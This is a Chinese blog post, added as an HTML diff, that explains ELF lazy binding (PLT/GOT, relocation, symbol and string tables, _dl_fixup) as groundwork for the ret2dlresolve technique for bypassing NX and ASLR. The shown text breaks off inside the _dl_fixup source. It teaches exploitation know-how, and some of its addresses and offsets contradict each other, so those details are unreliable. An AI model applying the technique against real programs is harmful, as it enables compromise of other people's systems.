@@ -1,0 +1,1384 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Ret2dlresolve, Matrix">
+    <meta name="description" content="延迟绑定技术因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Ret2dlresolve | Matrix</title>
+    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">Matrix</span>
+                    </a>
+                </div>
+                
+
+<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Matrix</div>
+        <div class="logo-desc">
+            
+            Fight Against Your Fate!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Ret2dlresolve
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                                <span class="chip bg-color">原理学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-08-17
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        5k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        23 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="延迟绑定技术"><a href="#延迟绑定技术" class="headerlink" title="延迟绑定技术"></a>延迟绑定技术</h2><p><strong>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程</strong></p>
+<p>适用于绕过NX和ASLR保护</p>
+<h2 id="探究延迟绑定技术"><a href="#探究延迟绑定技术" class="headerlink" title="探究延迟绑定技术"></a>探究延迟绑定技术</h2><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>
+<span class="token comment" spellcheck="true">// gcc -m32 -fno-stack-protector -no-pie test1.c -o test1</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>在开始前对print read函数，查看地址：</p>
+<pre class=" language-bash"><code class="language-bash">Reading symbols from test1<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
+gdb-peda$ p <span class="token function">read</span>
+<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">}</span> 0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
+gdb-peda$ </code></pre>
+<p>查看read的plt表的内容：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482e0
+   0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>:    
+    jmp    DWORD PTR ds:0x804a00c
+   0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0
+   0x80482eb <span class="token operator">&lt;</span>read@plt+11<span class="token operator">></span>:    jmp    0x80482d0</code></pre>
+<p>可知先会跳到0x804a00c处（read的got表）</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x0804a00c
+0x804a00c:    0x080482e6
+gdb-peda$ 
+所以此时read的got表中存储了read@plt的下一条地址
+0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0</code></pre>
+<p><strong>因此将会把0压入栈中</strong>，并跳转到0x80482d0地址执行</p>
+<p>0x80482d0为plt表的起始地址，称为plt0，其指令为：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482d0
+   0x80482d0:    push   DWORD PTR ds:0x804a004
+   0x80482d6:    jmp    DWORD PTR ds:0x804a008</code></pre>
+<p>可以看到这两条指令将got+4（0x804a004）里面的值压入栈中，然后跳转到got+8（0x804a008）的地方去执行。跟进got+8：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x804a008
+0x804a008:    0xf7fead90
+gdb-peda$ 
+这里存的就是大名鼎鼎的_dl_runtime_resolve函数的地址0xf7fead90</code></pre>
+<p>可以看到程序进入到了_dl_runtime_resolve，因此got+8的地方存储的是_dl_runtime_resolve函数的地址。看_dl_runtime_resolve的源码，源码在/sysdeps/i386/dl-trampoline.S中：</p>
+<pre class=" language-bash"><code class="language-bash">0xf7feed90 <span class="token operator">&lt;</span>_dl_runtime_resolve<span class="token operator">></span>       push   eax
+0xf7feed91 <span class="token operator">&lt;</span>_dl_runtime_resolve+1<span class="token operator">></span>     push   ecx
+0xf7feed92 <span class="token operator">&lt;</span>_dl_runtime_resolve+2<span class="token operator">></span>     push   edx
+0xf7feed93 <span class="token operator">&lt;</span>_dl_runtime_resolve+3<span class="token operator">></span>     mov    edx, dword ptr <span class="token punctuation">[</span>esp + 0x10<span class="token punctuation">]</span>
+0xf7feed97 <span class="token operator">&lt;</span>_dl_runtime_resolve+7<span class="token operator">></span>     mov    eax, dword ptr <span class="token punctuation">[</span>esp + 0xc<span class="token punctuation">]</span>
+0xf7feed9b <span class="token operator">&lt;</span>_dl_runtime_resolve+11<span class="token operator">></span>    call   _dl_fixup <span class="token operator">&lt;</span>0xf7fe85a0<span class="token operator">></span>
+注意这个 _dl_fixup 函数的调用</code></pre>
+<blockquote>
+<p>dl_runtime_resolve在源码中是用汇编实现的只是压栈并调用_dl_fixup，在跟进去_dl_fixup前，先给出一些与动态链接相关的数据结构。<br>根据《程序员的自我修养》中的描述：动态链接中最重要的结构应该是dynamic段，这个段里面保存了动态链接器所需要的基本信息。比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<br>我们来查看一下dynamic：</p>
+</blockquote>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -d test1
+
+Dynamic section at offset 0xf14 contains 24 entries:
+  标记        类型                         名称/值
+ 0x00000001 <span class="token punctuation">(</span>NEEDED<span class="token punctuation">)</span>                     共享库：<span class="token punctuation">[</span>libc.so.6<span class="token punctuation">]</span>
+ 0x0000000c <span class="token punctuation">(</span>INIT<span class="token punctuation">)</span>                       0x80482a8
+ 0x0000000d <span class="token punctuation">(</span>FINI<span class="token punctuation">)</span>                       0x80484d4
+ 0x00000019 <span class="token punctuation">(</span>INIT_ARRAY<span class="token punctuation">)</span>                 0x8049f0c
+ 0x0000001b <span class="token punctuation">(</span>INIT_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x0000001a <span class="token punctuation">(</span>FINI_ARRAY<span class="token punctuation">)</span>                 0x8049f10
+ 0x0000001c <span class="token punctuation">(</span>FINI_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x6ffffef5 <span class="token punctuation">(</span>GNU_HASH<span class="token punctuation">)</span>                   0x80481ac
+ 0x00000005 <span class="token punctuation">(</span>STRTAB<span class="token punctuation">)</span>    动态链接符号表    0x804821c
+ 0x00000006 <span class="token punctuation">(</span>SYMTAB<span class="token punctuation">)</span>    动态链接字符串    0x80481cc
+ 0x0000000a <span class="token punctuation">(</span>STRSZ<span class="token punctuation">)</span>                      74 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x0000000b <span class="token punctuation">(</span>SYMENT<span class="token punctuation">)</span>      单个符号表大小  16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x00000015 <span class="token punctuation">(</span>DEBUG<span class="token punctuation">)</span>                      0x0
+ 0x00000003 <span class="token punctuation">(</span>PLTGOT<span class="token punctuation">)</span>                     0x804a000
+ 0x00000002 <span class="token punctuation">(</span>PLTRELSZ<span class="token punctuation">)</span>                   16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x00000014 <span class="token punctuation">(</span>PLTREL<span class="token punctuation">)</span>                     REL
+ 0x00000017 <span class="token punctuation">(</span>JMPREL<span class="token punctuation">)</span>      函数重定位表    0x8048298
+ 0x00000011 <span class="token punctuation">(</span>REL<span class="token punctuation">)</span>                        0x8048290
+ 0x00000012 <span class="token punctuation">(</span>RELSZ<span class="token punctuation">)</span>                      8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x00000013 <span class="token punctuation">(</span>RELENT<span class="token punctuation">)</span>    单个重定位表大小  8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
+ 0x6ffffffe <span class="token punctuation">(</span>VERNEED<span class="token punctuation">)</span>                    0x8048270
+ 0x6fffffff <span class="token punctuation">(</span>VERNEEDNUM<span class="token punctuation">)</span>                 1
+ 0x6ffffff0 <span class="token punctuation">(</span>VERSYM<span class="token punctuation">)</span>                     0x8048266
+ 0x00000000 <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                       0x0
+``<span class="token variable"><span class="token variable">`</span><span class="token function">bash</span>
+
+他们其实是一个结构体数组，其结构体定义为：
+<span class="token variable">`</span></span>``c
+typedef struct <span class="token punctuation">{</span>
+    Elf32_Sword     d_tag<span class="token punctuation">;</span>
+    union <span class="token punctuation">{</span>
+        Elf32_Word  d_val<span class="token punctuation">;</span>
+        Elf32_Addr  d_ptr<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> d_un<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> Elf32_Dyn<span class="token punctuation">;</span>
+extern Elf32_Dyn_DYNAMIC<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+<p>Elf32_Dyn结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。下面给出和延迟绑定相关的类型值的定义。</p>
+<ul>
+<li><p>d_tag类型                     d_un的定义</p>
+</li>
+<li><p>#define DT_STRTAB 5            动态链接字符串表的地址，d_ptr表示.dynstr的地址 (Address of string table)</p>
+</li>
+<li><p>#define DT_SYMTAB 6         动态链接符号表的地址，d_ptr表示.dynsym的地址 (Address of symbol table)</p>
+</li>
+<li><p>#define DT_JMPREL 23         动态链接重定位表的地址,d_ptr表示.rel.plt的地址 (Address of PLT relocs)</p>
+</li>
+<li><p>#define DT_RELENT 19         单个重定位表项的大小，d_val表示单个重定位表项大小 (Size of one Rel reloc )</p>
+</li>
+<li><p>#define DT_SYMENT 11         单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry )<br>如上图所示，可以看到字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8<br>.rel.plt重定位表中包含了需要重定位的函数的信息，其也是一个结构体数组，结构体Elf32_Rel定义如下，其中r_offset表示got表地址，即动态解析函数后真正的函数地址需要填入的地方，r_info由两部分构成，r_info&gt;&gt;8表示该函数对应在符号表.dynsym中的下标，r_info&amp;0xff则表示重定位类型。：<br>（&gt;&gt;或&lt;&lt;就是将其二进制数据右移或左移，用0补齐）</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
+  Elf32_Addr        r_offset<span class="token punctuation">;</span>对于可执行文件，此值为虚拟地址
+  Elf32_Word       r_info<span class="token punctuation">;</span>用于符号表索引
+<span class="token punctuation">}</span> Elf32_Rel<span class="token punctuation">;</span></code></pre>
+</li>
+</ul>
+<p>查看一下重定位表0x8048298：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10x 0x8048298
+0x8048298:    0x0804a00c    0x00000107    0x0804a010    0x00000307
+0x80482a8 <span class="token operator">&lt;</span>_init<span class="token operator">></span>:    0x08ec8353    0x0000afe80x4fc38100    0x8b00001d
+0x80482b8 <span class="token operator">&lt;</span>_init+16<span class="token operator">></span>:    0xfffffc83    0x74c085ff
+gdb-peda$ </code></pre>
+<p>所以0x0804a00c就是r_offset中的数据 ，0x00000107是r_info中的数据</p>
+<p>再用readelf -r来查看程序的重定位表：</p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -r test1
+
+重定位节 <span class="token string">'.rel.dyn'</span> at offset 0x290 contains 1 entry:
+ 偏移量     信息    类型              符号值      符号名称
+08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__
+
+重定位节 <span class="token string">'.rel.plt'</span> at offset 0x298 contains 2 entries:
+ 偏移量     信息    类型              符号值      符号名称
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+偏移量即r_offset ,信息即r_info</code></pre>
+<p>可以看到重定位表.rel.plt为一个Elf32_Rel结构体数组，demo程序中该数组包含三个元素，第一个是read的重定位表项Elf32_Rel结构体，第二个是<strong>stack_chk_fail，第三个是</strong>libc_start_main。read的重定位表r_offset为0x0804a00c，为read的got地址，即在动态解析函数完成后，将read的函数地址填入到r_offset为0x0804a00c中。r_info为0x00000107表示read函数的符号表为.dynsym数组中的0x00000107&gt;&gt;8（即0x1）个元素，它的类型为0x00000107&amp;0xff（即0x7）对应为R_386_JUMP_SLOT类型。</p>
+<p>继续来看看dynsym节，由上文，它也是一个结构体Elf32_Sym数组，其定义如下：</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
+<span class="token punctuation">{</span>
+  Elf32_Word    st_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//符号名，是相对.dynstr起始的偏移</span>
+  Elf32_Addr    st_value<span class="token punctuation">;</span>
+  Elf32_Word    st_size<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，它是0x12</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>
+  Elf32_Section st_shndx<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>Elf32_Sym<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，其他字段都是0</span></code></pre>
+<p>其中st_name指向的是函数名称在.dynstr表中的偏移。在dynamic段中我们知道了符号表.dynsym地址为0x80481cc，查看它的值：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10wx 0x80481cc
+0x80481cc:    0x00000000    0x00000000    0x00000000    0x00000000
+0x80481dc:    0x0000001a    0x00000000    0x00000000    0x00000012
+0x80481ec:    0x0000003b    0x00000000
+gdb-peda$ </code></pre>
+<p>同样的也可以用readelf -s查看符号表内容</p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -s test1
+
+Symbol table <span class="token string">'.dynsym'</span> contains 5 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>
+     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>
+     4: 080484ec     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+
+num 就是.rel.plt结构体中的r_info<span class="token operator">>></span>8,是相对.dynstr起始的偏移,其他数值以此类推
+显然read相对于dynsym的偏移为1</code></pre>
+<p>果然dynsym第一个元素为read函数的Elf32_Sym结构体。再回到.dynsym地址0x80481cc：第一行就是dynsym表中的第0个结构体的数值内容，第二行就是read函数结构体的数值内容。这两行显然相差16字节，符合(SYMENT)      单个符号表大小  16字节。</p>
+<p>所以read结构体的st_name对应的是0x0000001a，即read字符串应该在.dynstr表偏移为0x2b的地方，由dynamic我们知道了.dynstr表的地址为地址为0x804821c，去验证下看其偏移0x1a是否为read字符串：</p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10s 0x804821c
+0x804821c:    <span class="token string">""</span>
+0x804821d:    <span class="token string">"libc.so.6"</span>
+0x8048227:    <span class="token string">"_IO_stdin_used"</span>
+0x8048236:    <span class="token string">"read"</span>
+0x804823b:    <span class="token string">"__libc_start_main"</span>
+0x804824d:    <span class="token string">"GLIBC_2.0"</span>
+0x8048257:    <span class="token string">"__gmon_start__"</span>
+0x8048266:    <span class="token string">""</span>
+0x8048267:    <span class="token string">""</span>
+0x8048268:    <span class="token string">"\002"</span>
+
+gdb-peda$ x/s 0x804821c+0x1a
+0x8048236:    <span class="token string">"read"</span>
+gdb-peda$ </code></pre>
+<p>可以看到确实如此。</p>
+<h3 id="大概流程："><a href="#大概流程：" class="headerlink" title="大概流程："></a>大概流程：</h3><ul>
+<li>可以先通过dynamic段获取各个表的地址，包括有字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8。</li>
+<li>read函数为.rel.plt表中的第一个元素，定位它的重定位表项，知道了read函数的r_offset为0x0804a00c，以及它在符号表中的下标为0x000001，它的类型为0x7，R_386_JUMP_SLOT。</li>
+<li>由0x000001知道了read函数的符号表是.dynsym第二个元素，获取到该结构体，得到了它对应的st_name对应的是0x0000001b，即获取了read字符串应该在.dynstr表偏移为0x1b的地方。</li>
+<li>最后调用函数解析匹配read字符串所对应的函数地址，将其填至r_offset为0x0804a00c，即read的got地址中。</li>
+</ul>
+<h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup:"></a>进入_dl_fixup:</h3><p>有了前面的基础，现在可以跟进去_dl_fixup，我们知道在调用_dl_runtime_resolve函数之前压入到栈中的参数是0，以及got+4中的值，参考下面_dl_fixup的源码，根据参数列表，知道了眼入栈中的0为reloc_arg，got+4中的值为struct link_map *l，函数源码在/elf/dl-runtime.c中：</p>
+<pre class=" language-c"><code class="language-c"><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> link_map <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+
+  <span class="token comment" spellcheck="true">//获取符号表地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">//获取字符串表地址</span>
+  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">//获取函数对应的重定位表结构地址</span>
+  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">//获取函数对应的符号表结构地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">//得到函数对应的got地址，即真实函数地址要填回的地址</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>
+
+  <span class="token comment" spellcheck="true">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span>
+  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment" spellcheck="true">/* Look up the target symbol.  If the normal lookup rules are not
+      used don't look in the global scope.  */</span>
+   <span class="token comment" spellcheck="true">//需要绕过</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">{</span>
